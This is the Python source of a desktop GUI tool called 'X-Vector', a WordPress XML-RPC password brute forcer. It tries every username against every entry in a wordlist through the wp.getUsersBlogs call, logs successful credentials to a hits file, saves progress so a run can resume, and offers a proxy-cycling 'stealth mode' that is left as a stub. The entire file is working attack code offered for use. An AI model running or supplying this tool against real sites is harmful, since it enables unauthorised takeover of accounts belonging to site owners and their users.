import os
import json
import time
import random
import threading
import xmlrpc.client
import itertools
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
from typing import List, Optional

import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk

# === Logging Setup ===
log_file_path = "xvector_log.txt"
logging.basicConfig(
    handlers=[RotatingFileHandler(log_file_path, maxBytes=5*1024*1024, backupCount=3)],
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("wp_brute")

# === Globals ===
session_file = "session.json"
abort_flag = threading.Event()

# === Helper Functions ===
def safe_log(message: str, level: str = "info") -> None:
    levels = {
        "info": logger.info,
        "success": logger.info,
        "error": logger.error,
        "warning": logger.warning,
    }
    levels.get(level, logger.info)(message)

    log_box.configure(state="normal")
    log_box.insert("end", f"{message}\n", level)
    log_box.see("end")
    log_box.configure(state="disabled")


def validate_url(url: str) -> bool:
    """Validate a URL format."""
    return url.startswith("http://") or url.startswith("https://")


def read_file_lines(file_path: str) -> List[str]:
    """Read lines from a file and return as a list."""
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        safe_log(f"[!] File not found: {file_path}", "error")
        raise
    except Exception as e:
        safe_log(f"[!] Error reading file {file_path}: {e}", "error")
        raise


def update_speed(start_time: float, attempt_counter: int) -> None:
    """Update the speed label dynamically."""
    while not abort_flag.is_set():
        elapsed = time.time() - start_time
        speed = attempt_counter / elapsed if elapsed > 0 else 0
        speed_label.configure(text=f"Speed: {speed:.2f} req/sec")
        time.sleep(1)


def save_session(resume_index: int) -> None:
    """Save session progress to a file."""
    try:
        with open(session_file, "w", encoding="utf-8") as sf:
            encrypted_data = json.dumps({"resume_index": resume_index})
            sf.write(encrypted_data)
    except Exception as e:
        safe_log(f"[!] Error saving session: {e}", "error")


def load_session() -> Optional[int]:
    """Load session progress from a file."""
    if os.path.exists(session_file):
        try:
            with open(session_file, "r", encoding="utf-8") as sf:
                session_data = json.load(sf)
                return session_data.get("resume_index", 0)
        except Exception as e:
            safe_log(f"[!] Error loading session: {e}", "error")
    return None


def brute_force_logic(server, username: str, password: str, proxies: itertools.cycle, stealth_mode: bool) -> bool:
    """Perform brute-force attempt for a single username and password."""
    try:
        if stealth_mode and proxies:
            current_proxy = next(proxies)
            safe_log(f"[*] Using proxy: {current_proxy}", "info")
            # Proxy logic can be implemented here if needed.

        resp = server.wp.getUsersBlogs(username, password)
        if resp:
            safe_log(f"[+] SUCCESS: {username}:{password}", "success")
            with open("hits.txt", "a", encoding="utf-8") as hf:
                hf.write(f"{username}:{password}\n")
            return True
    except xmlrpc.client.Fault:
        pass
    except Exception as e:
        safe_log(f"[!] Error for {username}:{password} -> {e}", "error")
    return False


def run_brute_force():
    """Main brute-force logic."""
    global abort_flag

    # Initialize
    abort_flag.clear()
    attempt_counter = 0
    start_time = time.time()

    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()
    stealth_mode = stealth_var.get()

    # Validate inputs
    if not validate_url(target):
        messagebox.showerror("Input Error", "Invalid target URL.")
        return
    if not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all required fields.")
        return

    # Prepare resources
    try:
        passwords = read_file_lines(wordlist_path)
    except Exception:
        return

    proxies = itertools.cycle(read_file_lines(proxy_entry.get().strip())) if stealth_mode else None
    resume_index = load_session() or 0

    # Connect to target
    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        safe_log(f"[!] Could not connect to target: {e}", "error")
        return

    # Brute-force logic
    for idx, username in enumerate(usernames):
        safe_log(f"[*] Trying username: {username}", "info")
        for pwd_idx, password in enumerate(passwords):
            if abort_flag.is_set():
                safe_log("[!] Attack aborted!", "warning")
                return

            if idx * len(passwords) + pwd_idx < resume_index:
                continue  # Skip already tried

            if brute_force_logic(server, username, password, proxies, stealth_mode):
                return

            attempt_counter += 1
            save_session(idx * len(passwords) + pwd_idx)

    messagebox.showinfo("Done", "Brute-force completed.")
    safe_log("[*] Brute-force completed.", "success")


# === GUI Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer (Pro)")
app.geometry("780x720")

# GUI Widgets
ctk.CTkLabel(app, text="Target URL (e.g., https://example.com/xmlrpc.php)").pack()
target_entry = ctk.CTkEntry(app, width=700)
target_entry.pack()

ctk.CTkLabel(app, text="Usernames (one per line)").pack()
usernames_box = ctk.CTkTextbox(app, height=80, width=700)
usernames_box.pack()

ctk.CTkLabel(app, text="Password Wordlist File").pack()
wordlist_entry = ctk.CTkEntry(app, width=500)
wordlist_entry.pack()

ctk.CTkLabel(app, text="Proxy List (Optional)").pack()
proxy_entry = ctk.CTkEntry(app, width=500)
proxy_entry.pack()

stealth_var = ctk.BooleanVar()
ctk.CTkCheckBox(app, text="Enable Stealth Mode", variable=stealth_var).pack()

ctk.CTkButton(app, text="Start Brute Force", command=lambda: threading.Thread(target=run_brute_force, daemon=True).start()).pack()
ctk.CTkButton(app, text="Abort", command=abort_flag.set).pack()

log_box = ctk.CTkTextbox(app, height=250, width=700, state="disabled")
log_box.pack()

speed_label = ctk.CTkLabel(app, text="Speed: 0.00 req/sec")
speed_label.pack()

# Start speed updater
threading.Thread(target=update_speed, args=(time.time(), 0), daemon=True).start()

app.mainloop()
